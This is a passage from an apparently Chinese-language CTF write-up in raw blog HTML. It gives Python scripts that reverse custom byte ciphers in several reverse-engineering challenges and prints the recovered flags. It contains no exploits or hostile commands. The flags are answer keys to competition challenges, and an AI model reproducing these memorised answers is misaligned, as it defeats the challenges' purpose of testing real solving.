class="line">  <span class="number">0xE2</span>, <span class="number">0x6F</span>]</span><br><span class="line">result1=[<span class="number">0</span>]*<span class="number">32</span></span><br><span class="line"><span class="comment"># result=[    0x95, 0x3B, 0xB2, 0x0B, 0xED, 0xE9, 0x4D, 0xD5, 0xA7, 0x22, </span></span><br><span class="line"><span class="comment">#   0x64, 0x1B, 0x5E, 0xCD, 0xBB, 0x8B, 0x06, 0x52, 0xD3, 0x82, </span></span><br><span class="line"><span class="comment">#   0x72, 0x28, 0x8E, 0x4C, 0xBE, 0xD3, 0x32, 0x66, 0x87, 0xB5, </span></span><br><span class="line"><span class="comment">#   0x6C, 0x76]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">7</span> | (result[i]&gt;&gt;<span class="number">1</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    result[i]=((result[i]^v4[i])-box2[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="comment">#26 4F DE 9C 0F 78 45 8A ED C1 46 09 8E B8 A0 12 FD AC 65 9B 65 2C 87 84 DA B2 18 06 81 F7 C6 BC</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">6</span> | (result[i]&gt;&gt;<span class="number">2</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    x=result[i]-box2[i]</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>: x+=<span class="number">256</span></span><br><span class="line">    result[i]=(x^v4[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="comment">#85 4F 3C B6 5E 9C C6 22 C3 3C 15 C6 86 76 79 43 79 3E C9 30 81 D3 51 73 3F F5 C7 54 1E 28 51 28</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result1[i]=result[box1[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=result1[box1[i]]</span><br><span class="line"><span class="comment">#5E 15 79 C6 28 86 D3 81 C3 22 C7 30 9C 43 79 76 3C 28 C9 4F 51 3F 3C 3E 73 F5 C6 54 B6 85 1E 51</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(box)):</span><br><span class="line">        <span class="keyword">if</span> result[i] == box[j]:</span><br><span class="line">            result[i] = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#E0 69 4B AE 75 0B F4 94 3D D0 FF 68 8C 86 4B 7D 29 75 92 60 45 4E 29 B8 54 7B AE 56 C3 93 12 45</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">3</span> | (result[i]&gt;&gt;<span class="number">5</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    result[i]=((result[i]^v4[i])-box2[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="comment">#E9 21 DF AC 42 0C 44 D4 D7 54 7B D3 49 86 1B 2C 33 2A 48 5D 72 46 85 25 E7 A4 34 87 5C 39 2C AB</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">5</span> | (result[i]&gt;&gt;<span class="number">3</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    x=result[i]-box2[i]</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>: x+=<span class="number">256</span></span><br><span class="line">    result[i]=(x^v4[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))    </span><br><span class="line"><span class="comment">#D1 FE 78 48 E1 31 0F 2A 44 5A 37 0E 08 90 26 42 50 C4 B9 F5 9A 9C 80 F0 79 ED 47 C5 C9 C2 3D F6</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result1[i]=result[box1[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=result1[box1[i]]</span><br><span class="line"><span class="comment">#E1 37 26 0E F6 08 9C 9A 44 2A 47 F5 31 42 50 90 78 C2 B9 FE 3D 79 5A C4 F0 ED 0F C5 48 D1 C9 80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(box)):</span><br><span class="line">        <span class="keyword">if</span> result[i] == box[j]:</span><br><span class="line">            result[i] = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="comment">#44 9C 55 76 8E 6F 8C DF 31 37 38 7B 89 A7 3C 7C 82 A9 C8 DA 10 4B 9A 6E 01 58 78 E9 5E C1 92 FD</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">4</span> | (result[i]&gt;&gt;<span class="number">4</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    result[i]=((result[i]^v4[i])-box2[i])&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="comment">#A8 A3 D2 BA 05 76 9F 7D AD 1F D7 3F FD 44 92 10 12 1B 40 F7 4D 8C 25 44 99 D6 A2 AB A3 B9 D5 D8</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">2</span> | (result[i]&gt;&gt;<span class="number">6</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    x=result[i]-box2[i]</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>: x+=<span class="number">256</span></span><br><span class="line">    result[i]=(x^v4[i])&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"><span class="comment">#6C 04 88 F5 2D D9 15 95 88 28 27 8C 5A 53 5F 87 32 FD B1 39 7D 0A 9C 43 EF 24 4B 07 CC 03 EB E4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result1[i]=result[box1[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=result1[box1[i]]</span><br><span class="line"><span class="comment">#2D 27 5F 8C E4 5A 0A 7D 88 95 4B 39 D9 87 32 53 88 03 B1 04 EB EF 28 FD 43 24 15 07 F5 6C CC 9C</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(box)):</span><br><span class="line">        <span class="keyword">if</span> result[i] == box[j]:</span><br><span class="line">            result[i] = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#8F BD 9F EC 66 9A 39 CA B6 49 79 0A 65 0D D7 AF B6 95 35 05 1C 5C 75 73 86 81 69 98 7B 16 EE 8C</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">1</span> | (result[i]&gt;&gt;<span class="number">7</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    result[i]=((result[i]^v4[i])-box2[i])&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#D1 F1 7C 48 E9 37 F9 A5 53 40 86 A2 AB 64 AE 98 57 AA E2 54 64 80 E2 44 8C 5C CF 08 B4 C9 61 9A</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=(result[i] &lt;&lt; <span class="number">5</span> | (result[i]&gt;&gt;<span class="number">3</span>))&amp;<span class="number">0xff</span></span><br><span class="line">    x=result[i]-box2[i]</span><br><span class="line">    <span class="keyword">if</span> x&lt;<span class="number">0</span>: x+=<span class="number">256</span></span><br><span class="line">    result[i]=(x^v4[i])&amp;<span class="number">0xff</span></span><br><span class="line"><span class="comment">#D4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result1[i]=result[box1[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    result[i]=result1[box1[i]]</span><br><span class="line"><span class="comment">#D4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(result)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(box)):</span><br><span class="line">        <span class="keyword">if</span> result[i] == box[j]:</span><br><span class="line">            result[i] = j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="comment">#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;----&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;0x<span class="subst">&#123;i:02x&#125;</span>&quot;</span> <span class="keyword">for</span> i <span class="keyword">in</span> result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>flag{Master_of_5mc_XoR_aDD_r0r!}</p>
<h3 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h3><p>找到加密逻辑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( Size_2 = <span class="number">0</span>; Size_2 != Size; ++Size_2 )</span><br><span class="line"> &#123;</span><br><span class="line">   HIWORD(v33) = (v29 &gt;&gt; <span class="number">2</span>) ^ (v29 &gt;&gt; <span class="number">3</span>) ^ (v29 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">   LOWORD(v33) = v29;</span><br><span class="line">   v29 = v33 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">   v34 = __ROL1__(v33, <span class="number">4</span>);</span><br><span class="line">   v35 = (<span class="number">4</span> * (v34 &amp; <span class="number">0x33</span>)) | (v34 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33</span>;</span><br><span class="line">   Buf1[Size_2] = *(_BYTE *)(Src_9 + Size_2) ^ (Size_2 + ((<span class="number">2</span> * (v35 &amp; <span class="number">0x55</span>)) | (v35 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55</span>));</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>不想逆向直接开爆</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">C = [  </span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0xA1</span>, <span class="number">0xFB</span>, <span class="number">0x53</span>, <span class="number">0x1C</span>, <span class="number">0xFA</span>, <span class="number">0xF0</span>, <span class="number">0x1B</span>, <span class="number">0x06</span>, <span class="number">0x40</span>,  </span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x8C</span>, <span class="number">0x16</span>, <span class="number">0xF4</span>, <span class="number">0x90</span>, <span class="number">0x27</span>, <span class="number">0x42</span>, <span class="number">0xB9</span>, <span class="number">0x8B</span>, <span class="number">0x0F</span>,  </span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0xD7</span>, <span class="number">0x31</span>, <span class="number">0xB7</span>, <span class="number">0x26</span>, <span class="number">0x12</span>, <span class="number">0x06</span>, <span class="number">0x7E</span>, <span class="number">0xAE</span>, <span class="number">0xDF</span>,  </span><br><span class="line">    <span class="number">0xDA</span>, <span class="number">0x68</span>, <span class="number">0xAF</span>, <span class="number">0x35</span>, <span class="number">0xCC</span>, <span class="number">0xB7</span>, <span class="number">0xB0</span>, <span class="number">0xD0</span>, <span class="number">0x9A</span>, <span class="number">0x59</span>,  </span><br><span class="line">    <span class="number">0x2B</span>, <span class="number">0x0B</span>  </span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>(<span class="params">cipher</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10000</span>):  </span><br><span class="line">        v29 = seed &amp; <span class="number">0xFFFF</span></span><br><span class="line">        plain = []</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            hi = ((v29 &gt;&gt; <span class="number">2</span>) ^ (v29 &gt;&gt; <span class="number">3</span>) ^ (v29 &gt;&gt; <span class="number">1</span>)) &amp; <span class="number">0xFFFF</span></span><br><span class="line">            v33 = (hi &lt;&lt; <span class="number">16</span> | v29) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            v29 = v33 &gt;&gt; <span class="number">1</span>  </span><br><span class="line">            lo = v33 &amp; <span class="number">0xFF</span></span><br><span class="line">            v34 = (lo &lt;&lt; <span class="number">4</span> | lo &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xFF</span>  </span><br><span class="line">            v35 = (<span class="number">4</span> * (v34 &amp; <span class="number">0x33</span>)) | ((v34 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33</span>)</span><br><span class="line">            key = (i + ((<span class="number">2</span> * (v35 &amp; <span class="number">0x55</span>)) | ((v35 &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55</span>))) &amp; <span class="number">0xFF</span></span><br><span class="line">            byte = cipher[i] ^ key</span><br><span class="line">            plain.append(byte)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0x20</span> &lt;= byte &lt;= <span class="number">0x7E</span> <span class="keyword">or</span> byte <span class="keyword">in</span> <span class="string">b&#x27;\t\n\r&#x27;</span>):</span><br><span class="line">                valid = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> valid:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="built_in">bytes</span>(plain).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> flag.startswith(<span class="string">&quot;flag&#123;&quot;</span>) <span class="keyword">and</span> flag.endswith(<span class="string">&quot;&#125;&quot;</span>):</span><br><span class="line">                <span class="keyword">return</span> seed, flag</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    seed, flag = find_flag(C)</span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;种子: 0x<span class="subst">&#123;seed:04X&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;未找到flag&quot;</span>)</span><br><span class="line">flag&#123;1c98572d-7f7b-4fbf-<span class="number">8750</span>-4a2986c695ce&#125;</span><br></pre></td></tr></table></figure>

<h3 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h3><p>比1逻辑清晰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">v8 = _mm_loadu_si128((const __m128i *)&amp;xmmword_1400032F8);</span><br><span class="line"> xmmword_140005630 = v11;</span><br><span class="line"> xmmword_140005620 = *(_OWORD *)Buffer;</span><br><span class="line"> xmmword_140005650 = v13;</span><br><span class="line"> v9 = _mm_loadu_si128((const __m128i *)&amp;xmmword_1400032E8);</span><br><span class="line"> xmmword_140005640 = v12;</span><br><span class="line"> do</span><br><span class="line"> &#123;</span><br><span class="line">   *(__m128i *)&amp;Buffer[n0x20] = _mm_add_epi8(</span><br><span class="line">                                  _mm_shuffle_epi8(_mm_loadu_si128((const __m128i *)&amp;Buffer[n0x20]), v8),</span><br><span class="line">                                  v9);</span><br><span class="line">   n0x20 += 16LL;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>小逆一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor  </span><br><span class="line"></span><br><span class="line">c = <span class="string">b&quot;cge87k?9&lt;&gt;?@=pss393=&gt;;8@:Cp@DAuH&quot;</span>  </span><br><span class="line"></span><br><span class="line">m1 = [</span><br><span class="line">    <span class="number">0x0F</span>, <span class="number">0x0E</span>, <span class="number">0x0D</span>, <span class="number">0x0C</span>, <span class="number">0x0B</span>, <span class="number">0x0A</span>, <span class="number">0x09</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">m2 = [</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x0A</span>, <span class="number">0x0B</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x0E</span>, <span class="number">0x0F</span>, <span class="number">0x10</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec</span>(<span class="params">b</span>):</span><br><span class="line">    tmp1 = <span class="built_in">list</span>(b)</span><br><span class="line">    tmp2 = [(tmp1[i] - m2[i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tmp1))]</span><br><span class="line">    tmp3 = [tmp2[idx] <span class="keyword">for</span> idx <span class="keyword">in</span> m1]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(tmp3)</span><br><span class="line">b1 = c[:<span class="number">16</span>]</span><br><span class="line">b2 = c[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dec(b1)+dec(b2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cdb0444318e24beb8f374e9181599072</span></span><br></pre></td></tr></table></figure>

<h3 id="df5"><a href="#df5" class="headerlink" title="df5"></a>df5</h3><p>真得dfs爆搜吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">box = [</span><br><span class="line">    <span class="number">0xB0</span>, <span class="number">0xF0</span>, <span class="number">0x21</span>, <span class="number">0xCF</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, <span class="number">0x3A</span>, <span class="number">0x68</span>, <span class="number">0x84</span>, <span class="number">0x7B</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0x86</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x9B</span>, <span class="number">0xF7</span>, 